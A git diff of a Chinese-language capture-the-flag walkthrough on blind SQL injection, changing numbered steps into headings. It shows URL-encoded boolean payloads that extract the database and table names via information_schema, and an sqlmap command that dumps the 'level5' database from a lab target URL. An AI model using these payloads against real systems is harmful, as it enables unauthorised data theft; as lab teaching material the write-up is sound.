@@ -45,7 +45,7 @@ select ascii(substring((select user()),[0-9],1))=[ascii码];
 ```
 
 # walkthrough 
-1. 直接使用 burp 进行测试,其请求的 url 构造如下
+## 直接使用 burp 进行测试,其请求的 url 构造如下
 ```
 %20and%20(select%20ascii(substring((select%20database()),1,1)))=11--
 ```
@@ -57,14 +57,14 @@ select ascii(substring((select user()),[0-9],1))=[ascii码];
 
 第一步结果得出数据库名为 `level5`
 
-2. 得出当前表名，其 url 构造如下
+## 得出当前表名，其 url 构造如下
 ```
 %20and%20(select%20ascii(substring((select table_name from information_schema.tables where table_schema="level5" limit 0,1),$_$,1)))=$_$ --
 ```
 
 得出第一张的表名：albums
 
-3. 使用 sqlmap 进行渗透
+## 使用 sqlmap 进行渗透
 ```
 python sqlmap.py -u http://35.227.24.107/bb66c5a931/fetch\?id\=2 -p id -o --random-agent -D level5 --dump --threads 10
 ```
